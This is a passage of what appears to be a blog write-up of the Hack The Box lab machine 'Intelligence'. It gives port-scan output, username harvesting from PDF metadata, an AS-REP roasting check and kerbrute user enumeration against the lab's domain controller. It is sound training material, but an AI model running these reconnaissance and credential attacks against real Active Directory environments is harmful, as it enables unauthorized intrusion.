<!doctype html><html lang="es"><head><title>Intelligence | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Windows. Medium machine. This machine presents an Active Directory (AD) environment to perform user enumeration, network poisoning and a Silver Ticket attack. Some scripting, DNS operations, AD attacks and BloodHound basics are needed to compromise this machine. This write-up uses a custom Go script to fuzz for files in a web server"><meta itemprop="description" content="Hack The Box. Windows. Medium machine. This machine presents an Active Directory (AD) environment to perform user enumeration, network poisoning and a Silver Ticket attack. Some scripting, DNS operations, AD attacks and BloodHound basics are needed to compromise this machine. This write-up uses a custom Go script to fuzz for files in a web server"><meta name="twitter:card" content="Hack The Box. Windows. Medium machine. This machine presents an Active Directory (AD) environment to perform user enumeration, network poisoning and a Silver Ticket attack. Some scripting, DNS operations, AD attacks and BloodHound basics are needed to compromise this machine. This write-up uses a custom Go script to fuzz for files in a web server"><meta name="twitter:description" content="Hack The Box. Windows. Medium machine. This machine presents an Active Directory (AD) environment to perform user enumeration, network poisoning and a Silver Ticket attack. Some scripting, DNS operations, AD attacks and BloodHound basics are needed to compromise this machine. This write-up uses a custom Go script to fuzz for files in a web server"><meta property="og:description" content="Hack The Box. Windows. Medium machine. This machine presents an Active Directory (AD) environment to perform user enumeration, network poisoning and a Silver Ticket attack. Some scripting, DNS operations, AD attacks and BloodHound basics are needed to compromise this machine. This write-up uses a custom Go script to fuzz for files in a web server"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/HTB/Intelligence/Intelligence.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Intelligence/Intelligence.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Intelligence/Intelligence.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="Intelligence"><meta property="twitter:title" content="Intelligence"><meta property="og:title" content="Intelligence"><meta property="og:url" content="https://7rocky.github.io/en/htb/intelligence/"><meta itemprop="keywords" content="dns,smb,bloodhound,metadata,password-spray,active-directory,silver-ticket-attack,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/intelligence/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb7" role="main"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label="aside" class="instapaper_ignoref b helvetica tracked">HTB</aside><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/intelligence/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/intelligence/&text=Intelligence" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/intelligence/&title=Intelligence" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Intelligence</h1><time class="f6 mv4 dib tracked" datetime="2021-11-27T00:00:00+01:00">27 / 11 / 2021</time></header><div class="htb-image"><img alt="Intelligence" src="/images/HTB/Intelligence/Intelligence.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/dns" title="DNS">DNS</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/smb" title="SMB">SMB</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/bloodhound" title="BloodHound">BloodHound</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/metadata" title="File metadata">File metadata</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/password-spray" title="Password spray">Password spray</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/active-directory" title="Active Directory">Active Directory</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/silver-ticket-attack" title="Silver Ticket attack">Silver Ticket attack</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/hash-cracking" title="Password hash cracking">Password hash cracking</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b mb1">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#finding-usernames-in-file-metadata">Finding usernames in file metadata</a></li><li><a href="#finding-more-files-and-usernames">Finding more files and usernames</a></li><li><a href="#obtaining-valid-user-credentials">Obtaining valid user credentials</a></li><li><a href="#enumerating-smb-shares">Enumerating SMB shares</a></li><li><a href="#lateral-movement">Lateral movement</a></li><li><a href="#performing-a-silver-ticket-attack">Performing a Silver Ticket attack</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺&nbsp;<span class="bmc-btn-text" style="font-family:cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Windows</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.10.248</li><li><strong>Release</strong>: 03 / 07 / 2021</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex"><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.248 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49229,49667,49691,49692,49704,49713 
</span></span><span style="display:flex"><span>Nmap scan report for 10.10.10.248
</span></span><span style="display:flex"><span>Host is up (0.36s latency).
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex"><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span style="display:flex"><span>| http-methods:
</span></span><span style="display:flex"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex"><span>|_http-title: Intelligence
</span></span><span style="display:flex"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: )
</span></span><span style="display:flex"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex"><span>| ssl-cert: Subject: commonName=dc.intelligence.htb
</span></span><span style="display:flex"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span style="display:flex"><span>| Not valid before: 2021-04-19T00:43:16
</span></span><span style="display:flex"><span>|_Not valid after:  2022-04-19T00:43:16
</span></span><span style="display:flex"><span>|_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time.
</span></span><span style="display:flex"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex"><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex"><span>| ssl-cert: Subject: commonName=dc.intelligence.htb
</span></span><span style="display:flex"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span style="display:flex"><span>| Not valid before: 2021-04-19T00:43:16
</span></span><span style="display:flex"><span>|_Not valid after:  2022-04-19T00:43:16
</span></span><span style="display:flex"><span>|_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time.
</span></span><span style="display:flex"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex"><span>| ssl-cert: Subject: commonName=dc.intelligence.htb
</span></span><span style="display:flex"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span style="display:flex"><span>| Not valid before: 2021-04-19T00:43:16
</span></span><span style="display:flex"><span>|_Not valid after:  2022-04-19T00:43:16
</span></span><span style="display:flex"><span>|_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time.
</span></span><span style="display:flex"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex"><span>| ssl-cert: Subject: commonName=dc.intelligence.htb
</span></span><span style="display:flex"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span style="display:flex"><span>| Not valid before: 2021-04-19T00:43:16
</span></span><span style="display:flex"><span>|_Not valid after:  2022-04-19T00:43:16
</span></span><span style="display:flex"><span>|_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time.
</span></span><span style="display:flex"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span style="display:flex"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex"><span>|_http-title: Not Found
</span></span><span style="display:flex"><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex"><span>49229/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex"><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex"><span>49691/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex"><span>49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex"><span>49704/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex"><span>49713/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Host script results:
</span></span><span style="display:flex"><span>| smb2-time:
</span></span><span style="display:flex"><span>|   date:
</span></span><span style="display:flex"><span>|_  start_date: N/A
</span></span><span style="display:flex"><span>| smb2-security-mode:
</span></span><span style="display:flex"><span>|   3.1.1:
</span></span><span style="display:flex"><span>|_    Message signing enabled and required
</span></span><span style="display:flex"><span>|_clock-skew: mean: 7h15m31s, deviation: 0s, median: 7h15m30s
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex"><span># Nmap done -- 1 IP address (1 host up) scanned in 103.53 seconds
</span></span></code></pre></div><p>This machine has ports 53 (DNS), 80 (HTTP), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP), 445 (SMB) and 5985 (WinRM) open, within others.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ crackmapexec smb 10.10.10.248
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
</span></span></code></pre></div><p>Moreover, we see that the machine is a domain controler (DC) from an Active Directory (AD) environment. We can start adding <code>intelligence.htb</code> into <code>/etc/hosts</code>.</p><h2 id="web-enumeration">Web enumeration</h2><p>If we start looking at <code>http://10.10.10.248</code>, we will see a webpage like this:</p><p><img src="/images/HTB/Intelligence/Intelligence-web.png" alt="Intelligence web"></p><p>Scrolling a bit, we can download two PDF files in the following links:</p><p><img src="/images/HTB/Intelligence/Intelligence-pdf.png" alt="Intelligence PDF downloads"></p><p>We can also copy the links and downloading using <code>wget</code> from the command line interface:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ wget http://10.10.10.248/documents/2020-01-01-upload.pdf 
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>$ wget http://10.10.10.248/documents/2020-12-15-upload.pdf
</span></span></code></pre></div><h2 id="finding-usernames-in-file-metadata">Finding usernames in file metadata</h2><p>Taking into account that we must compromise an Active Directory environment, we need to search for users and credentials (maybe NTLM hashes or Kerberos tickets).</p><p>The PDF files have a <em>Lorem ipsum</em> text inside, nothing interesting at all.</p><p>However, these PDF files contain also some metadata. And within these metadata, there are two usernames. We can extract metadata using <code>exiftool</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ exiftool *.pdf
</span></span><span style="display:flex"><span>======== 2020-01-01-upload.pdf
</span></span><span style="display:flex"><span>ExifTool Version Number         : 12.30
</span></span><span style="display:flex"><span>File Name                       : 2020-01-01-upload.pdf
</span></span><span style="display:flex"><span>Directory                       : .
</span></span><span style="display:flex"><span>File Size                       : 26 KiB
</span></span><span style="display:flex"><span>File Modification Date/Time     : 2021:04:01 19:00:00+02:00 
</span></span><span style="display:flex"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex"><span>File Type                       : PDF
</span></span><span style="display:flex"><span>File Type Extension             : pdf
</span></span><span style="display:flex"><span>MIME Type                       : application/pdf
</span></span><span style="display:flex"><span>PDF Version                     : 1.5
</span></span><span style="display:flex"><span>Linearized                      : No
</span></span><span style="display:flex"><span>Page Count                      : 1
</span></span><span style="display:flex"><span>Creator                         : William.Lee
</span></span><span style="display:flex"><span>======== 2020-12-15-upload.pdf
</span></span><span style="display:flex"><span>ExifTool Version Number         : 12.30
</span></span><span style="display:flex"><span>File Name                       : 2020-12-15-upload.pdf
</span></span><span style="display:flex"><span>Directory                       : .
</span></span><span style="display:flex"><span>File Size                       : 27 KiB
</span></span><span style="display:flex"><span>File Modification Date/Time     : 2021:04:01 19:00:00+02:00
</span></span><span style="display:flex"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex"><span>File Type                       : PDF
</span></span><span style="display:flex"><span>File Type Extension             : pdf
</span></span><span style="display:flex"><span>MIME Type                       : application/pdf
</span></span><span style="display:flex"><span>PDF Version                     : 1.5
</span></span><span style="display:flex"><span>Linearized                      : No
</span></span><span style="display:flex"><span>Page Count                      : 1
</span></span><span style="display:flex"><span>Creator                         : Jose.Williams
</span></span></code></pre></div><p>Now we have two potential usernames. Let&rsquo;s see if they are &ldquo;AS-REP Roastable&rdquo;:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ GetNPUsers.py -usersfile users.txt -dc-ip 10.10.10.248 -no-pass intelligence.htb/ 
</span></span><span style="display:flex"><span>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>[-] User William.Lee doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex"><span>[-] User Jose.Williams doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></code></pre></div><p>And they are not. Let&rsquo;s check at least that they are valid domain names with <a href="https://github.com/ropnop/kerbrute"><code>kerbrute</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ ./kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt 
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>&gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>&gt;   dc.intelligence.htb:88
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       William.Lee@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Jose.Williams@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  Done! Tested <span style="color:#ae81ff">2</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> valid<span style="color:#f92672">)</span> in 0.123 seconds
</span></span></code></pre></div><p>They are valid, but we have reached a dead end.</p><h2 id="finding-more-files-and-usernames">Finding more files and usernames</h2><p>Looking at the PDF filenames (<code>2020-01-01-upload.pdf</code> and <code>2020-12-15-upload.pdf</code>), we can guess that maybe there are more files stored in the web server with the same naming convention (namely, <code>YYYY-MM-DD-upload.pdf</code>).</p><p>In order to try all possible files within year 2020, I decided to use of a Go script called <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Intelligence/reqPdf.go"><code>reqPdf.go</code></a>, which will make all the requests and download the found files in less than a second (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Intelligence#reqPdfgo">here</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ go run reqPdf.go
</span></span><span style="display:flex"><span>Fuzzing PDF files of the form: YYYY-MM-DD-upload.pdf 
</span></span><span style="display:flex"><span>Found 84 files in 784.6615ms
</span></span></code></pre></div><p>As it can be seen, 84 files have been downloaded (actually, only 82 are new files). We can extract metadata using <code>exiftool</code> again. This time, we use some shell scripting to filter only the distinct usernames and save them to a file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ exiftool *.pdf | grep Creator | awk <span style="color:#e6db74">&#39;{ print $3 }&#39;</span> | sort -u | tee users.txt 
</span></span><span style="display:flex"><span>Anita.Roberts
</span></span><span style="display:flex"><span>Brian.Baker
</span></span><span style="display:flex"><span>Brian.Morris
</span></span><span style="display:flex"><span>Daniel.Shelton
</span></span><span style="display:flex"><span>Danny.Matthews
</span></span><span style="display:flex"><span>Darryl.Harris
</span></span><span style="display:flex"><span>David.Mcbride
</span></span><span style="display:flex"><span>David.Reed
</span></span><span style="display:flex"><span>David.Wilson
</span></span><span style="display:flex"><span>Ian.Duncan
</span></span><span style="display:flex"><span>Jason.Patterson
</span></span><span style="display:flex"><span>Jason.Wright
</span></span><span style="display:flex"><span>Jennifer.Thomas
</span></span><span style="display:flex"><span>Jessica.Moody
</span></span><span style="display:flex"><span>John.Coleman
</span></span><span style="display:flex"><span>Jose.Williams
</span></span><span style="display:flex"><span>Kaitlyn.Zimmerman
</span></span><span style="display:flex"><span>Kelly.Long
</span></span><span style="display:flex"><span>Nicole.Brock
</span></span><span style="display:flex"><span>Richard.Williams
</span></span><span style="display:flex"><span>Samuel.Richardson
</span></span><span style="display:flex"><span>Scott.Scott
</span></span><span style="display:flex"><span>Stephanie.Young
</span></span><span style="display:flex"><span>Teresa.Williamson
</span></span><span style="display:flex"><span>Thomas.Hall
</span></span><span style="display:flex"><span>Thomas.Valenzuela
</span></span><span style="display:flex"><span>Tiffany.Molina
</span></span><span style="display:flex"><span>Travis.Evans
</span></span><span style="display:flex"><span>Veronica.Patel
</span></span><span style="display:flex"><span>William.Lee
</span></span></code></pre></div><p>Let&rsquo;s check if all the got usernames are valid:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ ./kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt 
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>&gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>&gt;   dc.intelligence.htb:88
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Brian.Morris@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Daniel.Shelton@intelligence.htb
